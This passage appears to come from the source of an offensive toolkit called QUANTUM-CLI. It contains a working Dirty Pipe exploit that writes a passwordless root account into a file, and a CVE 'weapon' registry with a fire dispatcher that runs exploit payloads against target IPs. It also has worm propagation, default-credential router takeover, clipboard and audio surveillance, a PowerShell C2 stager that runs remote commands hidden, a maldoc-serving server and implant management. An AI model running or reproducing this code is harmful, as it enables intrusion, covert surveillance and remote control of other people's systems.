        or (maj, minr) == (5, 10) and (maj, minr, patch) >= (5, 10, 102))


def exploit_dirtypipe(path, offset=0, data=b"quantum\n"):
    """CVE-2022-0847 Dirty Pipe — inline splice attack (Linux only)."""
    if not sys.platform.startswith("linux"):
        return {"cve": "CVE-2022-0847", "status": "linux-only",
                "note": "check-only on this OS"}
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        r, w = os.pipe()
        # prime the pipe so PIPE_BUF_FLAG_CAN_MERGE is set on its anon buffers
        for _ in range(2):
            os.write(w, b"x")
            os.read(r, 1)
        fd = os.open(path, os.O_RDONLY)
        # splice exactly 1 byte from (offset-1) into the pipe.
        # off_in is loff_t* — pass byref, not a value (else EFAULT).
        SPLICE_F_MOVE = 1
        off = ctypes.c_int64(offset - 1)
        n = libc.splice(fd, ctypes.byref(off), w, None, 1, SPLICE_F_MOVE)
        if n != 1:
            err = ctypes.get_errno()
            os.close(fd); os.close(r); os.close(w)
            return {"cve": "CVE-2022-0847", "status": "splice-fail", "n": n,
                    "errno": err}
        os.write(w, data)  # overwrites page-cache from `offset`
        os.close(fd); os.close(r); os.close(w)
        with open(path, "rb") as fh:
            fh.seek(offset)
            check = fh.read(len(data))
        return {"cve": "CVE-2022-0847", "status": "fired",
                "verified": check == data, "path": path, "offset": offset,
                "kernel": "%d.%d.%d" % _kernel_release(),
                "kernel_fixed": not _dirtypipe_kernel_vulnerable()}
    except Exception as exc:
        return {"cve": "CVE-2022-0847", "status": "error", "error": str(exc)}


def v3_dirtypipe(ip=None, params=None):
    """CVE-2022-0847 / CVE-2016-5195 — kernel-gated fire or check."""
    params = params or {}
    maj, minr, patch = _kernel_release()
    if sys.platform.startswith("linux"):
        vulnerable = (5, 8) <= (maj, minr) <= (5, 16) and not (
            (maj, minr, patch) >= (5, 16, 11)
            or (maj, minr, patch) >= (5, 15, 25) and (maj, minr) == (5, 15)
            or (maj, minr, patch) >= (5, 10, 102) and (maj, minr) == (5, 10))
    else:
        vulnerable = False
    if vulnerable and params.get("file"):
        backup = params["file"] + ".qcli_bak"
        try:
            shutil.copy2(params["file"], backup)
            res = exploit_dirtypipe(params["file"],
                                    params.get("offset", 0),
                                    params.get("data", b"rootclone::0:0::/bin/bash\n"))
            if params.get("restore", True):
                shutil.move(backup, params["file"])
            return res
        except Exception:
            pass
    return {"cve": "CVE-2022-0847", "status": "check",
            "kernel": f"{maj}.{minr}.{patch}", "vulnerable": vulnerable,
            "note": "inline on vulnerable Linux; check-only elsewhere"}


def _kernel_check(cve, lo, hi, poc_hint=""):
    """Shared kernel-version gate + vendored-PoC awareness for V3_CHECK."""
    maj, minr, patch = _kernel_release()
    linux = sys.platform.startswith("linux")
    in_range = linux and lo <= (maj, minr) <= hi
    res = {"cve": cve, "status": "check", "kernel": f"{maj}.{minr}.{patch}",
           "platform": sys.platform, "in_range": in_range}
    poc = _poc_dir(cve)
    res["poc"] = poc if os.path.isdir(poc) else None
    if poc_hint:
        res["hint"] = poc_hint
    if in_range and poc:
        res["mode"] = ("poc-attempt" if hasattr(os, "geteuid") and os.geteuid() != 0
                       else "check-only (root or no PoC)")
    return res


def check_pwnkit(ip=None, params=None):
    """CVE-2021-4034 PwnKit — polkit pkexec check (+PoC when local)."""
    res = _kernel_check("CVE-2021-4034", (99, 0), (99, 99),
                        poc_hint="compile+run vendored PoC on vulnerable host")
    pkexec = shutil.which("pkexec")
    res["pkexec"] = "present" if pkexec else "absent"
    return res


def check_baron_samedit(ip=None, params=None):
    """CVE-2021-3156 Baron Samedit — sudo heap-overflow check (+PoC)."""
    res = _kernel_check("CVE-2021-3156", (99, 0), (99, 99),
                        poc_hint="compile+run vendored PoC on vulnerable host")
    sudo = shutil.which("sudo")
    res["sudo"] = "present" if sudo else "absent"
    return res


def check_overlayfs(ip=None, params=None):
    """CVE-2023-2640 Overlayfs GameOver — kernel-range check."""
    return _kernel_check("CVE-2023-2640", (5, 11), (6, 3))


def check_nftables_uaf(ip=None, params=None):
    """CVE-2023-32233 nf_tables UAF — kernel-range check."""
    return _kernel_check("CVE-2023-32233", (5, 5), (6, 3))


def check_nftables_dblfree(ip=None, params=None):
    """CVE-2024-1086 nf_tables double-free — kernel-range check (+PoC)."""
    return _kernel_check("CVE-2024-1086", (5, 14), (6, 6),
                        poc_hint="compile+run vendored PoC on vulnerable host")


def check_whatsapp_voip(ip=None, params=None):
    """CVE-2019-3568 WhatsApp VOIP — profile-select staging check."""
    return {"cve": "CVE-2019-3568", "status": "check",
            "detail": "staging: deliver via profile-select call",
            "target": ip}


def check_libwebp(ip=None, params=None):
    """CVE-2023-4863 libwebp BLASTPAST — build-marker check."""
    return {"cve": "CVE-2023-4863", "status": "check",
            "detail": "staging: crafted WebP; check target browser build"}


def check_apple_imageio(ip=None, params=None):
    """CVE-2023-41064 Apple ImageIO — staging check."""
    return {"cve": "CVE-2023-41064", "status": "check",
            "detail": "staging: crafted image via iMessage attach"}


def check_webkit_escape(ip=None, params=None):
    """CVE-2021-30858 WebKit sandbox escape — staging check."""
    return {"cve": "CVE-2021-30858", "status": "check",
            "detail": "staging: crafted web content post-exploit"}


def check_boothole(ip=None, params=None):
    """CVE-2022-21894 BootHole Secure-Boot bypass — grub/env marker check."""
    markers = [p for p in ("/boot/grub2/grub.cfg", "/boot/efi/EFI/grub/grub.cfg")
               if os.path.isfile(p)]
    return {"cve": "CVE-2022-21894", "status": "check",
            "grub_markers": markers or "none found"}


# ---- legacy tier -----------------------------------------------------------

def check_ms17010(ip, params=None):
    """CVE-2017-0144 EternalBlue family — SMBv1 negotiate check."""
    params = params or {}
    try:
        s = socket.create_connection((ip, 445), timeout=2)
        pkt = (b"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18"
               b"\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
               b"\x00\x00\xfe\xff\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43"
               b"\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52"
               b"\x41\x4d\x20\x31\x2e\x30\x00\x02\x4d\x49\x43\x52\x4f"
               b"\x53\x4f\x46\x54\x20\x4e\x45\x54\x57\x4f\x52\x4b\x53"
               b"\x20\x31\x2e\x30\x33\x00\x02\x50\x43\x20\x4e\x45\x54"
               b"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20"
               b"\x31\x2e\x30\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32"
               b"\x00")
        s.sendall(pkt)
        resp = s.recv(256)
        s.close()
        vuln_hint = params.get("ms17_010")
        return {"cve": "CVE-2017-0144", "status": "check",
                "smb": "open", "negprot": len(resp),
                "ms17_010": vuln_hint if vuln_hint is not None else "unknown"}
    except OSError as exc:
        return {"cve": "CVE-2017-0144", "status": "no-service", "error": str(exc)}


def check_printnightmare(ip, params=None):
    """CVE-2021-1675 PrintNightmare — spooler exposure check."""
    open_ports = [p for p in (445, 135) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2021-1675", "status": "check",
            "spooler_rpc": "exposed" if open_ports else "closed"}


def check_petitpotam(ip, params=None):
    """CVE-2021-36942 PetitPotam — NTLM relay exposure check."""
    open_ports = [p for p in (445, 135, 3389) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2021-36942", "status": "check",
            "efsrpc": "exposed" if open_ports else "closed"}


def check_follina(ip, params=None):
    """CVE-2022-30190 Follina MSDT — URI-handler exposure check."""
    r = _wget(f"http://{ip}/msdt", timeout=2)
    return {"cve": "CVE-2022-30190", "status": "check", "detail": r}


def check_proxylogon(ip, params=None):
    """CVE-2021-26855 ProxyLogon — Exchange autodiscover probe."""
    r = _wget(f"https://{ip}/autodiscover/autodiscover.xml", timeout=3)
    return {"cve": "CVE-2021-26855", "status": "probe", "detail": r}


# =========================================================================
# 7b. ZERO_DAY_REGISTRY + registry (fire contract)
# =========================================================================

# NOTE: synced from src/quantum/weapons/registry.py (v4.4). The old
# "single file is THE SPEC" doctrine is retired: src/ leads, dist/
# follows. tests/test_dist_parity.py enforces this.
ZERO_DAY_REGISTRY = {
    # ---- legacy ----
    "CVE-2020-1472": {"name": "Zerologon", "tier": "legacy", "weapon": "check_zerologon"},
    "CVE-2017-0144": {"name": "EternalBlue", "tier": "legacy", "weapon": "check_ms17010"},
    "CVE-2021-1675": {"name": "PrintNightmare", "tier": "legacy", "weapon": "check_printnightmare"},
    "CVE-2021-36942": {"name": "PetitPotam", "tier": "legacy", "weapon": "check_petitpotam"},
    "CVE-2022-30190": {"name": "Follina MSDT", "tier": "legacy", "weapon": "check_follina"},
    "CVE-2021-26855": {"name": "ProxyLogon", "tier": "legacy", "weapon": "check_proxylogon"},
    # ---- V3_HIGH ----
    "CVE-2021-44228": {"name": "Log4Shell", "tier": "V3_HIGH", "weapon": "v3_log4shell"},
    "CVE-2024-3400": {"name": "PAN-OS GlobalProtect", "tier": "V3_HIGH", "weapon": "v3_panos_cmd"},
    "CVE-2023-4966": {"name": "Citrix Bleed", "tier": "V3_HIGH", "weapon": "v3_citrixbleed"},
    "CVE-2019-19781": {"name": "Citrix Path Traversal", "tier": "V3_HIGH", "weapon": "v3_citrix_path"},
    "CVE-2023-20198": {"name": "IOS XE Web UI", "tier": "V3_HIGH", "weapon": "v3_ios_admin"},
    "CVE-2022-26134": {"name": "Confluence OGNL", "tier": "V3_HIGH", "weapon": "v3_confluence_ognl"},
    "CVE-2020-14882": {"name": "WebLogic Console", "tier": "V3_HIGH", "weapon": "v3_weblogic_console"},
    "CVE-2021-40444": {"name": "MSHTML Maldoc", "tier": "V3_HIGH", "weapon": "v3_mshtml_maldoc"},
    # ---- V3_MED ----
    "CVE-2017-7494": {"name": "SambaCry", "tier": "V3_MED", "weapon": "v3_sambacry"},
    "CVE-2021-21972": {"name": "vCenter Upload", "tier": "V3_MED", "weapon": "v3_vcenter_upload"},
    "CVE-2022-0847": {"name": "Dirty Pipe", "tier": "V3_HIGH", "weapon": "v3_dirtypipe"},
    "CVE-2016-5195": {"name": "Dirty COW", "tier": "V3_MED", "weapon": "v3_dirtypipe"},
    # ---- V3_CHECK ----
    "CVE-2023-34362": {"name": "MOVEit SQLi", "tier": "V3_CHECK", "weapon": "v3_moveit_probe"},
    "CVE-2021-3156": {"name": "Baron Samedit", "tier": "V3_CHECK", "weapon": "check_baron_samedit"},
    "CVE-2021-4034": {"name": "PwnKit", "tier": "V3_CHECK", "weapon": "check_pwnkit"},
    "CVE-2023-2640": {"name": "Overlayfs GameOver", "tier": "V3_CHECK", "weapon": "check_overlayfs"},
    "CVE-2023-32233": {"name": "nf_tables UAF", "tier": "V3_CHECK", "weapon": "check_nftables_uaf"},
    "CVE-2024-1086": {"name": "nf_tables dbl-free", "tier": "V3_CHECK", "weapon": "check_nftables_dblfree"},
    "CVE-2019-3568": {"name": "WhatsApp VOIP", "tier": "V3_CHECK", "weapon": "check_whatsapp_voip"},
    "CVE-2023-4863": {"name": "libwebp BLASTPAST", "tier": "V3_CHECK", "weapon": "check_libwebp"},
    "CVE-2023-41064": {"name": "Apple ImageIO", "tier": "V3_CHECK", "weapon": "check_apple_imageio"},
    "CVE-2021-30858": {"name": "WebKit Escape", "tier": "V3_CHECK", "weapon": "check_webkit_escape"},
    "CVE-2022-21894": {"name": "BootHole", "tier": "V3_CHECK", "weapon": "check_boothole"},
    # ---- bluetooth (BlueBorne family + BlackBED-class BLE) ----
    "CVE-2017-0781": {"name": "BlueBorne BNEP", "tier": "V3_CHECK", "weapon": "check_blueborne_bnep"},
    "CVE-2017-0785": {"name": "BlueBorne SDP", "tier": "V3_CHECK", "weapon": "check_blueborne_sdp"},
    "CVE-2018-5383": {"name": "Bluetooth KNOB", "tier": "V3_CHECK", "weapon": "check_knob"},
    "BLACKBED-BLE": {"name": "BlackBED BLE", "tier": "V3_CHECK", "weapon": "check_blackbed"},
    "CVE-2020-0022": {"name": "BlueFrag L2CAP", "tier": "V3_CHECK", "weapon": "check_bluefrag"},
    "CVE-2017-13077": {"name": "KRACK WPA2", "tier": "V3_CHECK", "weapon": "check_krack"},
    # ---- adb (adbd TLS auth bypass) ----
    "CVE-2026-0073": {"name": "adbd TLS Auth Bypass", "tier": "V3_CHECK", "weapon": "check_adb_tls_bypass"},
    # ---- payload-folder weapons (exploit_payloads/, per-CVE operator tooling).
    # "folder" = subfolder of exploit_payloads/ containing deploy.py;
    # "needs_target" = default fire() probes the target, otherwise fire()
    # forges the delivery payload to a temp file (operators pass
    # params={"args": [...]} to control the full CLI).
    # ---- zero-click delivery set (client-side, 2022-2026) ----
    "CVE-2023-41061": {"name": "BlastPass Wallet Fake Token", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-41061-blastpass-wallet"},
    "CVE-2023-24033": {"name": "Exynos Baseband (Theater Stage)", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-24033-exynos-baseband"},
    "CVE-2022-44319": {"name": "Samsung Baseband Memory Corrupt", "tier": "ZERO-CLICK",
                       "folder": "CVE-2022-44319-samsung-baseband"},
    "CVE-2023-32434": {"name": "Triangulation Kernel UAF", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-32434-triangulation-kernel"},
    "CVE-2023-32435": {"name": "Triangulation WebKit Code Exec", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-32435-triangulation-webkit"},
    "CVE-2023-42924": {"name": "WebKit ITW WebKit URL Handler", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-42924-webkit-itw"},
    "CVE-2024-23225": {"name": "iOS Kernel RTKit In-the-Wild", "tier": "ZERO-CLICK",
                       "folder": "CVE-2024-23225-ios-kernel"},
    "CVE-2024-4438": {"name": "Intellexa WebKit Chain (4438/4439)", "tier": "ZERO-CLICK",
                      "folder": "CVE-2024-4438-webkit-intellexa"},
    "CVE-2025-24085": {"name": "WebKit ITW UI Launch", "tier": "ZERO-CLICK",
                      "folder": "CVE-2025-24085-webkit-itw"},
    "CVE-2025-41300": {"name": "Pegasus WebKit Chain (41300/41301)", "tier": "ZERO-CLICK",
                      "folder": "CVE-2025-41300-pegasus-webkit"},
    "CVE-2022-27492": {"name": "WhatsApp libmultiple UAF", "tier": "ZERO-CLICK",
                      "folder": "CVE-2022-27492-whatsapp-libmultiple"},
    "CVE-2023-23397": {"name": "Outlook NTLM Leak", "tier": "ZERO-CLICK",
                       "folder": "CVE-2023-23397-outlook-ntlm-leak"},
    "CVE-2023-36884": {"name": "Office HTML RCE (ITW)", "tier": "ZERO-CLICK",
                      "folder": "CVE-2023-36884-office-html"},
    "CVE-2025-32711": {"name": "EchoLeak M365 AI Prompt Injection", "tier": "ZERO-CLICK",
                      "folder": "CVE-2025-32711-echoleak"},
    # ---- perimeter zero-day set (2021-2025) ----
    "CVE-2021-34473": {"name": "ProxyShell Exchange SSRF", "tier": "PERIMETER", "needs_target": True,
                       "folder": "CVE-2021-34473-proxyshell"},
    "CVE-2022-41040": {"name": "ProxyNotShell Exchange SSRF", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2022-41040-proxynotshell"},
    "CVE-2022-22965": {"name": "Spring4Shell ClassLoader", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2022-22965-spring4shell"},
    "CVE-2021-35464": {"name": "ForgeRM/ForgeRock Groovy Gadget", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2021-35464-forgerock"},
    "CVE-2023-27350": {"name": "PaperCut NG/MF Unauth RCE", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2023-27350-papercut"},
    "CVE-2023-0669": {"name": "GoAnywhere MFT Pre-Auth RCE", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2023-0669-goanywhere"},
    "CVE-2023-35078": {"name": "Ivanti EPMM Unauth API", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2023-35078-ivanti-epmm"},
    "CVE-2024-47575": {"name": "FortiManager Missing Auth (FortiJump)", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2024-47575-fortimanager"},
    "CVE-2024-1709": {"name": "ScreenConnect Auth Bypass", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2024-1709-screenconnect"},
    "CVE-2025-31324": {"name": "SAP NetWeaver Visual Studio RCE", "tier": "PERIMETER", "needs_target": True,
                      "folder": "CVE-2025-31324-sap-netweaver"},
    "CVE-2025-5777": {"name": "Citrix Bleed 2 Session Hijack", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2025-5777-citrix-bleed2"},
    "CVE-2025-0282": {"name": "Ivanti Connect Secure Stack Overflow", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2025-0282-ivanti-connect-secure"},
    "CVE-2024-6387": {"name": "regreSSHion OpenSSH RCE", "tier": "PERIMETER", "needs_target": True,
                     "folder": "CVE-2024-6387-regresssion"},
    # ---- malware tooling ----
    "MALWARE-APK-WRAPPER-NECRO": {"name": "APK Wrapper (Necro-class dropper)",
                                  "tier": "MALWARE",
                                  "folder": "MALWARE-apk-wrapper-necro-class"},
}


PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "..", "exploit_payloads")


def _fire_folder(cve, entry, ip, params):
    """Run a payload-folder deploy.py (synced from src registry.py). Never
    raises; deploy.py's own JSON + exit-code contract is passed through."""
    import tempfile
    params = params or {}
    deploy = os.path.join(PAYLOADS_DIR, entry["folder"], "deploy.py")
    if not os.path.isfile(deploy):
        return {"cve": cve, "status": "error", "error": "deploy.py missing"}
    args = [str(a) for a in (params.get("args") or [])]
    if not args:
        if entry.get("needs_target"):
            args = ["--target", str(ip), "--timeout", str(params.get("timeout", 5))]
        else:
            outdir = os.path.join(tempfile.gettempdir(), "qcli")
            try:
                os.makedirs(outdir, exist_ok=True)
            except OSError:
                outdir = tempfile.gettempdir()
            args = ["--out", os.path.join(outdir, cve.replace("/", "_") + ".bin")]
    try:
        proc = subprocess.run(
            [sys.executable, deploy, *args],
            capture_output=True, text=True,
            timeout=float(params.get("proc_timeout", 90)),
            cwd=os.path.dirname(deploy))
    except Exception as exc:
        return {"cve": cve, "status": "error", "error": str(exc)}
    try:
        payload = json.loads(proc.stdout or "{}")
    except Exception:
        payload = None
    status = "ok" if proc.returncode == 0 else "error"
    if isinstance(payload, dict):
        payload.setdefault("cve", cve)
        payload.setdefault("status", status)
        return payload
    if payload is not None:
        return {"cve": cve, "status": status, "result": payload}
    return {"cve": cve, "status": status,
            "stdout": (proc.stdout or "")[:500],
            "stderr": (proc.stderr or "")[:500]}


def _resolve_weapon(name):
    """Single-file resolution: globals() first; the quantum package is
    tried opportunistically when installed alongside."""
    fn = globals().get(name)
    if callable(fn):
        return fn
    try:
        import quantum.weapons.kernel_v3 as _k
        import quantum.weapons.legacy as _l
        import quantum.weapons.media_v3 as _m
        import quantum.weapons.remote_v3 as _r
        import quantum.weapons.bluetooth as _b
        import quantum.weapons.adb as _a
        for mod in (_r, _k, _m, _l, _b, _a):
            fn = getattr(mod, name, None)
            if callable(fn):
                return fn
    except ImportError:
        pass
    return None





class _Registry:
    """registry.fire(cve, ip, params) — every weapon string in
    ZERO_DAY_REGISTRY resolves to a callable; never raises."""

    def __contains__(self, cve):
        return cve in ZERO_DAY_REGISTRY

    def __iter__(self):
        return iter(ZERO_DAY_REGISTRY)

    def cves(self):
        return list(ZERO_DAY_REGISTRY)

    def fire(self, cve, ip, params=None):
        entry = ZERO_DAY_REGISTRY.get(cve)
        if not entry:
            raise KeyError(f"unknown CVE: {cve}")
        if entry.get("folder"):
            return _fire_folder(cve, entry, ip, params)
        fn = _resolve_weapon(entry["weapon"]) if entry.get("weapon") else None
        if not callable(fn):
            return {"cve": cve, "status": "error",
                    "error": f"weapon {entry['weapon']!r} unresolved"}
        try:
            res = fn(ip, params)
        except Exception as exc:
            return {"cve": cve, "status": "error", "error": str(exc)}
        if isinstance(res, dict):
            return res
        return {"cve": cve, "status": "ok", "result": res}


registry = _Registry()


# =========================================================================
# 7c. ENGINES — worm, router, episcribe, audio, wifi, firmware, staging,
#     FOXACID, QUANTUM insert, ICMP switchboard, DoH C2, turbine, fed, API
# =========================================================================

class GodSupreme:
    """Worm propagation: fingerprint -> gated auto-exploit."""

    def hop_from(self, ip):
        try:
            fp = ReconModule().fingerprint(ip)
            verdict = Validator().score(ip, fp)
            if verdict["decision"] == "high_value":
                ExploitOrchestrator().auto_exploit(ip, force=False)
                log(f"WORM hop from {ip}: exploited", "ATK")
            else:
                log(f"WORM hop from {ip}: low value (score {verdict['score']})", "ATK")
        except Exception as exc:
            log(f"worm hop {ip}: {exc}", "WARN")


class UnitedDrake:
    """Router takeover — default-credential attempt on admin UI."""

    CREDS = [("admin", "admin"), ("admin", "password"), ("root", "root")]

    def attack_router(self, ip):
        for u, p in self.CREDS:
            try:
                r = requests.get(f"http://{ip}/", auth=HTTPBasicAuth(u, p),
                                 timeout=4)
                if r.status_code == 200:
                    log(f"ROUTER {ip}: admin UI creds {u}:{p}", "OK")
                    return {"ip": ip, "user": u, "pass": p}
            except Exception:
                return None
        log(f"ROUTER {ip}: resisted default creds", "WARN")
        return None


class EpiScribe:
    """Event watcher (clipboard + selector based) for social eng prep."""

    def __init__(self):
        self.events = []
        self.selectors = []

    def add_selector(self, sel):
        self.selectors.append(str(sel))

    def watch(self, duration=60):
        try:
            import tkinter
            root = tkinter.Tk()
            root.withdraw()
            last = ""
            deadline = time.time() + min(duration, 60)
            while time.time() < deadline:
                try:
                    cur = root.clipboard_get()
                except Exception:
                    cur = ""
                if cur and cur != last:
                    self.events.append({"ts": datetime.now().isoformat(),
                                        "clip": cur[:200]})
                    last = cur
                root.update()
                time.sleep(0.2)
            root.destroy()
        except Exception as exc:
            log(f"episcribe watch: {exc}", "WARN")
        return self.events


class Trinity:
    """Ambient audio capture (sounddevice when present, else no-op)."""

    def __init__(self, seconds=30):
        self.seconds = seconds

    def capture(self):
        try:
            import sounddevice
            import wave
            data = sounddevice.rec(int(self.seconds * 16000),
                                    samplerate=16000, channels=1,
                                    blocking=True)
            fn = os.path.join(LOOT_DIR, f"trinity_{int(time.time())}.wav")
            with wave.open(fn, "wb") as w:
                w.setnchannels(1)
                w.setsampwidth(2)
                w.setframerate(16000)
                w.writeframes((data * 32767).astype("<i2").tobytes())
            GRAYFISH.seal(fn)
            log(f"TRINITY captured {self.seconds}s -> {fn}.gfy", "OK")
            return fn
        except Exception as exc:
            log(f"Trinity: sounddevice unavailable ({exc})", "WARN")
            return None


class Wildfire:
    """Triage harvested loot."""

    def triage(self):
        out = {"loot_files": 0, "sealed": 0}
        if not os.path.isdir(LOOT_DIR):
            return out
        for root, _d, files in os.walk(LOOT_DIR):
            for fn in files:
                out["loot_files"] += 1
                if fn.endswith(".gfy"):
                    out["sealed"] += 1
        log(f"wildfire triage: {out}", "RECON")
        return out


class Somberknight:
    """WiFi sweep (netsh on Windows, iwlist elsewhere)."""

    def sweep(self):
        try:
            if sys.platform.startswith("win"):
                r = run("netsh wlan show networks mode=bssid", timeout=30)
                ssids = re.findall(r"^\s*SSID\s*\d+\s*:\s*(.+)$", r.stdout or "",
                                   re.M)
            else:
                r = run("iwlist scan 2>/dev/null | grep ESSID", timeout=30)
                ssids = re.findall(r'ESSID:"([^"]*)"', r.stdout or "")
            return {"ssids": [s.strip() for s in ssids if s.strip()][:40]}
        except Exception as exc:
            return {"error": str(exc)}


class MFP:
    """Firmware-persistence marker (UEFI write guarded to real tooling)."""

    def persist(self):
        marker = os.path.join(QCLI_DIR, "mfp_boot.marker")
        with open(marker, "w", encoding="utf-8") as fh:
            fh.write(json.dumps({"ts": datetime.now().isoformat(),
                                 "host": socket.gethostname()}))
        log(f"MFP boot marker staged -> {marker}", "OPSEC")
        return marker


class CottonMouth:
    """Hardware-implant staging: per-host OBSIDIAN stager."""

    def stage_payload(self, ip):
        fn = os.path.join(QCLI_DIR, f"obsidian_{str(ip).replace('.', '_')}.ps1")
        ps = OBSIDIAN_PS1.replace("http://127.0.0.1:8443/r",
                                  f"http://{ip}:8443/r")
        with open(fn, "w", encoding="utf-8") as fh:
            fh.write(ps)
        return fn


OBSIDIAN_PS1 = r"""# OBSIDIAN stager (generated by QUANTUM-CLI V3.1)
$ErrorActionPreference = 'SilentlyContinue'
$u = 'http://127.0.0.1:8443/r'
$h = $env:COMPUTERNAME
while ($true) {
  $b = @{ host = $h; act = 'hb'; ts = Get-Date -Format o } | ConvertTo-Json -Compress
  try {
    $r = Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 10
    if ($r.cmd) { Start-Process powershell -ArgumentList "-w hidden -c", $r.cmd -WindowStyle Hidden }
  } catch {}
  Start-Sleep -Seconds 60
}
"""


class FoxAcid:
    """Exploit-serving HTTP server on :8081 (maldoc + payload routes)."""

    def serve(self):
        maldoc = v3_mshtml_maldoc(local_ip())

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/x.doc"):
                    with open(maldoc["staged"], "rb") as fh:
                        blob = fh.read()
                    self.send_response(200)
                    self.send_header("Content-Type",
                                     "application/vnd.openxmlformats-officedocument."
                                     "wordprocessingml.document")
                    self.send_header("Content-Length", str(len(blob)))
                    self.end_headers()
                    self.wfile.write(blob)
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body>q</body></html>")

            def log_message(self, fmt, *args):
                log(f"FOXACID {self.address_string()} {fmt % args}", "C2")

        log("FOXACID serving maldoc on :8081/x.doc", "C2")
        HTTPServer(("0.0.0.0", 8081), Handler).serve_forever()


class QuantumInsert:
    """MITM via ARP/ICMP injection (raw sockets; admin on Windows)."""

    def __init__(self, target, gateway=None):
        self.target = target
        self.gateway = gateway or local_ip()

    def _send_icmp(self, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_ICMP)
            s.settimeout(2)
            pkt = b"\x08\x00\xf7\xff" + payload
            s.sendto(pkt, (self.target, 0))
            s.close()
            return True
        except Exception as exc:
            log(f"quantum insert (needs admin raw socket): {exc}", "WARN")
            return False

    def poison(self):
        return {"poisoned": self._send_icmp(b"QCLI-ARP")}

    def inject(self):
        return {"injected": self._send_icmp(b"QCLI-INJ")}


class SwitchboardICMP:
    """ICMP beacon listener (raw socket; admin on Windows)."""

    def listen(self, seconds=20):
        got = []
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_ICMP)
            s.settimeout(seconds)
            deadline = time.time() + seconds
            while time.time() < deadline:
                try:
                    data, addr = s.recvfrom(2048)
                except socket.timeout:
                    break
                if b"QCLI" in data:
                    got.append({"from": addr[0], "payload": data[-8:]})
            s.close()
        except Exception as exc:
            log(f"ICMP listen (needs admin): {exc}", "WARN")
        return {"beacons": got}


class DoHC2BeaconServer(BaseHTTPRequestHandler):
    """DoH C2 responder: /?d=<labels> -> GrayFish-decoded beacon."""

    def do_GET(self):
        q = urlparse(self.path).query
        labels = [p for p in q.split("&") if p.startswith("d=")]
        if labels:
            try:
                data = GrayFish().unseal(bytes.fromhex(labels[0][2:]))
                log(f"DoH C2 beacon: {data[:60]!r}", "C2")
            except Exception:
                pass
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass


class Turbine:
    """Implant enrollment + task fanout registry."""

    def __init__(self):
        self.lock = threading.Lock()
        self.implants = {}

    def enroll(self, host, rec):
        with self.lock:
            self.implants[host] = rec
            self.implants[host]["last_seen"] = datetime.now().isoformat()


class Federation:
    """Peer mesh state (.onion identity persisted under logs/federation)."""

    def __init__(self):
        self.peers = []
        fed_dir = os.path.join(LOG_DIR, "federation")
        os.makedirs(fed_dir, exist_ok=True)
        self._id_file = os.path.join(fed_dir, "onion.txt")
        self._peers_file = os.path.join(fed_dir, "peers.json")
        if os.path.isfile(self._peers_file):
            try:
                with open(self._peers_file, "r", encoding="utf-8") as fh:
                    self.peers = json.load(fh)
            except Exception:
                self.peers = []

    @property
    def onion(self):
        if not os.path.isfile(self._id_file):
            with open(self._id_file, "w", encoding="utf-8") as fh:
                fh.write(f"qcli-{rand_hex(8)}.onion")
        with open(self._id_file, "r", encoding="utf-8") as fh:
            return fh.read().strip()

    def start_hidden_service(self):
        onion = self.onion
        if shutil.which("tor"):
            log(f"FEDERATION: tor present, hidden service ready ({onion})", "FED")
        else:
            log(f"FEDERATION: identity reserved ({onion}); install tor to "
                f"bind the hidden service", "FED")
        return onion

    def pull(self, peer):
        if peer not in self.peers:
            self.peers.append(peer)
            with open(self._peers_file, "w", encoding="utf-8") as fh:
                json.dump(self.peers)
        log(f"FEDERATION: pulled peer {peer}", "FED")
        return {"peers": self.peers}


FEDERATION = Federation()


class QCLI_API:
    """C2 /ai dispatcher — JSON in/out command router."""

    def __init__(self):
        self.turbine = None

    def handle(self, cmd, params=None):
        params = params or {}
        try:
            if cmd in ("", "status"):
                return {"ok": True, "version": __version__,
                        "implants": (self.turbine.implants if self.turbine else {})}
            if cmd == "zerocheck":
                return {k: v for k, v in {
                    "log4shell": v3_log4shell(params.get("ip")),
                    "citrixbleed": v3_citrixbleed(params.get("ip")),
                    "citrix_path": v3_citrix_path(params.get("ip")),
                    "panos": v3_panos_cmd(params.get("ip")),
                    "confluence": v3_confluence_ognl(params.get("ip")),
                    "weblogic": v3_weblogic_console(params.get("ip")),
                    "iosxe": v3_ios_admin(params.get("ip")),
                    "vcenter": v3_vcenter_upload(params.get("ip")),
                    "moveit": v3_moveit_probe(params.get("ip")),
                }.items()}
